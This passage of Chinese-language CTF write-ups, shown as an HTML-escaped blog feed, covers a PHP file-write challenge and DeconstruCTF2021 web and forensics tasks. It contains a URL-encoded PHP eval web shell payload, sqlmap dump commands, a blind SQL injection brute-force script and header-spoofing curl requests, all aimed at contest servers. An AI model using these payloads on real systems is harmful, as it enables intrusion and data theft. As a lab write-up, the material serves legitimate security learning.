&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;notewrite&amp;#34;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$newnote&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;notewrite&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#75715e">//3rd times the charm and I&amp;#39;ve learned my lesson. Now I&amp;#39;ll make sure to filter more than once :)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$newnote&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">generateRandomString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">array_push&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;notes&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$filename&lt;/span>&lt;span style="color:#d88200">.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$filename&lt;/span>&lt;span style="color:#d88200">.php&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;location:index.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç®€å•çœ‹ä¸€ä¸‹æµç¨‹ï¼Œ&lt;code>filter()&lt;/code>å‡½æ•°ä¼šå¯¹æˆ‘ä»¬postä¼ å…¥çš„notewriteå‚æ•°ï¼ˆä¹Ÿå°±æ˜¯ä¼šè¢«å†™å…¥çš„æ–‡ä»¶å†…å®¹ï¼‰è¿›è¡Œæ¯”è¾ƒä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæ–‡ä»¶åæ˜¯&lt;code>generateRandomString()&lt;/code>ç”Ÿæˆçš„éšæœºåå­—ï¼Œä½†æ˜¯ä¸é‡è¦ï¼Œå®ƒä¼šè‡ªåŠ¨æ‹¼ä¸Š.phpçš„åç¼€å¹¶ä¸”æŠŠåå­—å†™åˆ°&lt;code>session['notes']&lt;/code>ä¸­ï¼›æ‰€ä»¥æˆ‘ä»¬å”¯ä¸€éœ€è¦å¤„ç†çš„å°±æ˜¯&lt;code>filter()&lt;/code>å‡½æ•°çš„ç»•è¿‡äº†&lt;/p>
&lt;p>å°´å°¬çš„æ˜¯è¿™ä¸ª&lt;code>filter()&lt;/code>è·Ÿä¸ªç­›å­ä¸€æ ·â€¦â€¦é¦–å…ˆæ˜¯æ²¡æœ‰è¿‡æ»¤&lt;code>eval()&lt;/code>ï¼Œå…¶æ¬¡æ˜¯&lt;code>str_replace()&lt;/code>ä¹Ÿæ˜¯æ°´çš„ä¸€æ‰¹&lt;/p>
&lt;p>payload:&lt;/p>
&lt;pre tabindex="0">&lt;code>notewrite=%3C%3C%3C%3C%3F%3F%3F%3Fphp+%40eval%28%24_POST%5B%27wuhu%27%5D%29%3B
&lt;/code>&lt;/pre>&lt;p>ä¹‹åè¿ä¸Šèšå‰‘å³å¯æŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„flag.php&lt;/p>
&lt;p>&lt;code>flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}&lt;/code>&lt;/p>
&lt;h2 id="forensicsobligatory-shark">forensics/Obligatory Shark&lt;/h2>
&lt;blockquote>
&lt;p>remember to wrap the flag&lt;/p>
&lt;/blockquote>
&lt;p>çœ‹tcpæµï¼Œtelnetæ˜æ–‡æµé‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030120130169.png" alt="image-20211030120130169">&lt;/p>
&lt;p>33a465747cb15e84a26564f57cda0988&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107144316344.png" alt="image-20211107144316344">&lt;/p>
&lt;p>&lt;code>flag{dancingqueen}&lt;/code>&lt;/p></description></item><item><title>DeconstruCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</link><pubDate>Sat, 30 Oct 2021 13:35:32 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</guid><description>&lt;p>&lt;a href="https://ctftime.org/event/1453/tasks/">https://ctftime.org/event/1453/tasks/&lt;/a>&lt;/p>
&lt;h2 id="webheres-a-flag">Web/Here&amp;rsquo;s a Flag&lt;/h2>
&lt;blockquote>
&lt;p>A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224148107.png" alt="image-20211003224148107">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224209166.png" alt="image-20211003224209166">&lt;/p>
&lt;p>&lt;a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">https://www.youtube.com/watch?v=dQw4w9WgXcQ&lt;/a> ä¸ç”¨çœ‹äº† Never Gonna Give You Up&lt;/p>
&lt;p>çœ‹style.css flag: &amp;ldquo;gvf{zh0frph_wr_ghfrqvwuxfwi}&amp;quot;; ä½†æ˜¯ä¸æ˜¯æœ€ç»ˆçš„flagï¼Œè§£ä¸€ä¸‹rot13 amount=23&lt;/p>
&lt;p>&lt;code>dsc{we0come_to_deconstructf}&lt;/code>&lt;/p>
&lt;p>ç­¾åˆ°é¢˜ä¹Ÿå¥½æŠ˜è…¾TAT&lt;/p>
&lt;h2 id="webplease">Web/Please&lt;/h2>
&lt;blockquote>
&lt;p>Hi there! We used to work together back in our old company DEEMA. I recently had a problem with my computer and lost all the files on it. I remember creating a backup of my files on the company&amp;rsquo;s servers. I know it&amp;rsquo;s been a while, but could you &lt;strong>please&lt;/strong> try to access those files? I would be very grateful!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003225518532.png" alt="image-20211003225518532">&lt;/p>
&lt;p>ç†Ÿç»ƒæŠ“åŒ…ï¼ŒCookieä¸­æœ‰ä¸¤ä¸ªå‚æ•°ï¼ŒAdmin_Accesså’ŒUsernameï¼Œæ”¹ä¸ºTrueå’ŒClancy&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230430641.png" alt="image-20211003230430641">&lt;/p>
&lt;p>æ”¹æµè§ˆå™¨æ ‡è¯†å¤´ &lt;code>User-Agent: DeemBrowser&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230638917.png" alt="image-20211003230638917">&lt;/p>
&lt;p>éœ€è¦åŸºç¡€è®¤è¯ï¼Œä½†æ˜¯è¿™é‡Œçš„MagicWordç¨å¾®å¡äº†ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003232421727.png" alt="image-20211003232421727">&lt;/p>
&lt;p>åŸå› æ˜¯æˆ‘å¤ªé“¸å¸äº†å¿˜äº†åŠ Basicï¼Œ&lt;code>Authorization: Basic V2hhdCdzVGhlTWFnaWNXb3JkPw==&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004003846943.png" alt="image-20211004003846943">&lt;/p>
&lt;p>åŠ ä¸€ä¸ªæ—¥æœŸçš„å¤´ï¼Œ&lt;code>Date: Thu, 1 Apr 2021 12:00:00 GMT&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004026742.png" alt="image-20211004004026742">&lt;/p>
&lt;p>æ¢æˆ&lt;code>Date: Mon, 5 Apr 2021 12:00:00 GMT&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004153788.png" alt="image-20211004004153788">&lt;/p>
&lt;p>&lt;code>dsc{4ll-y0u-g0tt4-d0-15-r3qu35t-n1c3ly}&lt;/code>&lt;/p>
&lt;h2 id="webtaxi-union-problems">Web/Taxi Union Problems&lt;/h2>
&lt;blockquote>
&lt;p>An important package has been stolen from Mr Nagaraj by a Taxi driver. We&amp;rsquo;ve tried to ask the local taxi union about driver&amp;rsquo;s location but they are refusing provide the same.&lt;/p>
&lt;p>Since this package is required for a time sensitive matter we don&amp;rsquo;t have time to negotiate with the union.&lt;/p>
&lt;p>Your task is to obtain the location of the taxi using the given information
&lt;code>Taxi Lisence Plate: TN-06-AP-9879&lt;/code>&lt;/p>
&lt;p>HINT: The flag is the location of the taxi (no caps)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003233419781.png" alt="image-20211003233419781">&lt;/p>
&lt;p>è¾“å…¥&lt;code>TN-06-AP-9879'--%20&lt;/code>å›æ˜¾ä¸€æ ·ï¼Œæœ‰æ³¨å…¥ï¼ŒæŠŠpostçš„å†…å®¹æ‹¿å»è®©sqlmapè·‘ä¸€ä¸‹&lt;/p>
&lt;pre tabindex="0">&lt;code>python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate --tables
python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate -T taxi --columns
python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate -T taxi --dump
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000253417.png" alt="image-20211004000253417">&lt;/p>
&lt;p>Ayanavaram&lt;/p>
&lt;h2 id="webnever-gonna-lie-to-you">*Web/Never gonna lie to you&lt;/h2>
&lt;blockquote>
&lt;p>Trust me, take everything in the home page for face value. I would never lie to you.&lt;/p>
&lt;/blockquote>
&lt;p>ä¸»é¡µæœ‰ä¸€å¥&lt;em>Not even search engines can find it.&lt;/em>ï¼Œæç¤ºæˆ‘ä»¬çœ‹/robots.txt&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000643314.png" alt="image-20211004000643314">&lt;/p>
&lt;p>è½¬åˆ°/never_gonna_give_you_upé¡µé¢ï¼Œæ ‡é¢˜æ˜¯Admin Pageä½†æ˜¯ä¸€ç‰‡ç©ºç™½ï¼ŒæŠ“åŒ…åçœ‹åˆ°postè¡¨å•çš„åœ°æ–¹è¢«æŠ¬å¤´ç»™æŒ¡ä½äº†ï¼Œç›®æ ‡åœ°å€æ˜¯/never_gonna_let_you_down&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000944013.png" alt="image-20211004000944013">&lt;/p>
&lt;p>æäº¤ä¸¤ä¸ªå‚æ•°usernameå’Œpasswordï¼Œå›æ˜¾&lt;em>YOU LIED TO ME !!!&lt;/em>&lt;/p>
&lt;p>â€”â€”â€”â€”ç„¶åæ²¡ç„¶åäº† æˆ‘è¿˜æ²¡çœ‹å®Œ ç¯å¢ƒå°±å…³äº†TAT&lt;/p>
&lt;h2 id="webcurly-fries-1">Web/Curly Fries 1&lt;/h2>
&lt;blockquote>
&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. The flag is right in front of you.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004170846442.png" alt="image-20211004170846442">&lt;/p>
&lt;p>emmmmm æ²¡æœ‰ä»»ä½•æç¤º&lt;/p>
&lt;p>çœ‹wpä»¥åå‘ç°è¿™æ˜¯çœŸè„‘æ´äº†ï¼Œä½†ä¹Ÿä¸èƒ½è¿™ä¹ˆè¯´ï¼Œæ¯•ç«Ÿå·²ç»ç»™å‡ºäº†Swedenå¾ˆæ˜æ˜¾çš„æç¤ºï¼Œæˆ‘ä»¬éœ€è¦ç”¨æŒ‡å®šçš„Swedishè¯­è¨€æ¥è®¿é—®è¿™ä¸ªç½‘ç«™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -i http://very.uniquename.xyz:8880/ -H &lt;span style="color:#d88200">&amp;#34;Accept-Language: sv-SE&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171513900.png" alt="image-20211004171513900">&lt;/p>
&lt;p>&lt;code>dsc{1_l0v3_sw3d3n}&lt;/code>&lt;/p>
&lt;h2 id="webthe-gate-keeper">Web/The Gate Keeper&lt;/h2>
&lt;blockquote>
&lt;p>That what you want is with the Gate keeper, but you need to cheat the Gate keeper to get it.&lt;/p>
&lt;p>&lt;strong>Note:&lt;/strong> This challenge might require a bruteforce approach.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171755317.png" alt="image-20211004171755317">&lt;/p>
&lt;p>è¿˜æ˜¯sqli&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">domain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_lowercase&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_uppercase&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;_}&amp;#39;&lt;/span>
&lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gate keeper&amp;#34;&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;taxi union&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://extremely.uniquename.xyz:2052/&amp;#39;&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;TN-06-AP-9879&amp;#34;&lt;/span>
&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;lisence_plate&amp;#39;&lt;/span>
&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;location&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">elif&lt;/span> &lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;gate keeper&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://extremely.uniquename.xyz:2082/&amp;#39;&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;The flag for the CTF is the password you entered.(If you havent cheated that is)&amp;#34;&lt;/span>
&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>
&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;URL&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">domain&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; or &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200"> like &amp;#39;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">%&amp;#39;; --&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">column&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">char&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">char&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Success &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webhungry-man">Web/Hungry Man&lt;/h2>
&lt;blockquote>
&lt;p>There is nothing here I promise! ;)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172041299.png" alt="image-20211004172041299">&lt;/p>
&lt;p>æŠ“åŒ…ï¼Œcookieéƒ¨åˆ†æœ‰ä¸€ä¸ªb64ï¼Œè§£ç å&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172123925.png" alt="image-20211004172123925">&lt;/p>
&lt;p>è¯´å®è¯ï¼Œè¿™ä¸ªé¢˜åšçš„æ—¶å€™æ²¡æ³¨æ„set-cookieçš„éƒ¨åˆ†ï¼Œ&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Hungry%20Man">å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>è¿™é‡Œçš„ä¾æ®set-cookieçš„å€¼è®¾ç½®åï¼Œä¼šä¸æ–­çš„äº§ç”Ÿæ–°çš„md5-hashçš„cookieå€¼ï¼Œå†™ä¸€ä¸ªè„šæœ¬ä¸æ–­åœ°è®¾ç½®å’Œåº”ç”¨æ–°çš„cookieï¼Œå°†è¿™äº›è§£å¯†åæ‹¼èµ·æ¥å°±æ˜¯flagäº†&lt;/p>
&lt;p>&lt;code>dsc{91v3_m3_4_h4ndfu1_0f_c00k135}&lt;/code>&lt;/p>
&lt;h2 id="webcurly-fries-2">Web/Curly Fries 2&lt;/h2>
&lt;blockquote>
&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. Why do logos make things so recognizable?&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172502484.png" alt="image-20211004172502484">&lt;/p>
&lt;p>æ— æç¤ºï¼Œ&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%202">å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>æœ‰ç‚¹è„‘æ´äº†ï¼ŒæŠŠUser-Agentçš„åœ°æ–¹è®¾ç½®ä¸ºxboxå’ŒLinuxä¹‹åï¼Œå›¾ç‰‡ä¼šæ¶ˆå¤±å¹¶éœ²å‡ºflag&lt;/p>
&lt;p>&lt;code>dsc{1m4g1n3_l1nux_0n_4n_xb0x}&lt;/code>&lt;/p>
&lt;h2 id="webcurly-fries-3">Web/Curly Fries 3&lt;/h2>
&lt;blockquote>
&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. I&amp;rsquo;m with you, every step of the way.&lt;/p>
&lt;/blockquote>
&lt;p>ç›´æ¥è®¿é—®æç¤º405ï¼Œpostä¸€ä¸‹å›æ˜¾&lt;em>perhaps try Googling me instead?&lt;/em>&lt;/p>
&lt;p>è®¿é—®/robots.txtï¼Œ404&lt;/p>
&lt;p>ç”¨wappalyzerå¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªflaskåº”ç”¨&lt;/p>
&lt;p>&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%203">å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>çœ‹åˆ°ç¬¬ä¸€ä¸ªæç¤ºä¹‹åä¸å¤Ÿæ•æ„Ÿï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®æ¥æºreferæ˜¯google.com&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>å›æ˜¾ä¸­æç¤ºæˆ‘ä»¬å†è®¾ç½®Host&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H&amp;quot;Host:https://dscvit.com&amp;quot; http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>å›æ˜¾&lt;em>potates and carrots are my friends, milk and Cookies will be my end&lt;/em>ï¼Œä¸æ˜¯å¾ˆæ˜æ˜¾ï¼Œä½†æ˜¯åº”è¯¥è®¾ç½®cookie=root&lt;/p>
&lt;p>ä¹‹åå›æ˜¾&lt;em>JFATHER, JMOTHER, JDAUGHTER, ____?&lt;/em>ï¼Œæç¤ºæŠŠcontent-typeæ”¹ä¸ºjson&lt;/p>
&lt;p>å›æ˜¾*{&amp;lsquo;error&amp;rsquo;: &amp;lsquo;json data missing&amp;rsquo;}*ï¼Œæ·»åŠ ä¸€ç‚¹data&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H &amp;quot;Host: https://www.dscvit.com&amp;quot; -H &amp;quot;Content-Type: application/json&amp;quot; --cookie &amp;quot;user=root&amp;quot; -d '{&amp;quot;foo&amp;quot;:&amp;quot;bar&amp;quot;}' http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>å›æ˜¾*{&amp;lsquo;error&amp;rsquo;: {&amp;lsquo;messi&amp;rsquo;: &amp;lsquo;required&amp;rsquo;}}&lt;em>ï¼Œå°†fooæ”¹ä¸ºbarï¼Œå›æ˜¾&lt;/em>{&amp;lsquo;error&amp;rsquo;: {&amp;lsquo;messi&amp;rsquo;: &amp;lsquo;which club am i at?'}}*&lt;/p>
&lt;p>*ä¸å¤ªæ‡‚ä¸ºå•¥è¿™å°±èƒ½çŸ¥é“æŠŠbarèµ‹å€¼ä¸ºPSGï¼Ÿï¼Ÿï¼Ÿ&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H &amp;quot;Host: https://www.dscvit.com&amp;quot; -H &amp;quot;Content-Type: application/json&amp;quot; --cookie &amp;quot;user=root&amp;quot; -d '{&amp;quot;messi&amp;quot;:&amp;quot;psg&amp;quot;}' http://overly.uniquename.xyz:2095/
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°flag &lt;code>dsc{th15_15_w4y_t00_much_w0rk}&lt;/code>&lt;/p>
&lt;h2 id="webmega-mailer">Web/Mega Mailer&lt;/h2>
&lt;blockquote>
&lt;p>We recently launched a mass email sender that can work with any SMTP server, but recently we have reports of information leaks and and trolling through our service. Can you find whats wrong with it ?&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004005500420.png" alt="image-20211004005500420">&lt;/p>
&lt;p>è®²çœŸï¼Œä¹‹å‰æ²¡æ¥è§¦è¿‡&lt;/p>
&lt;p>é¦–å…ˆåœ¨è‡ªå·±çš„vpsä¸Šå¼€ä¸€ä¸ªsmtpçš„æœåŠ¡ï¼Œç”¨pythonå¼€&lt;/p>
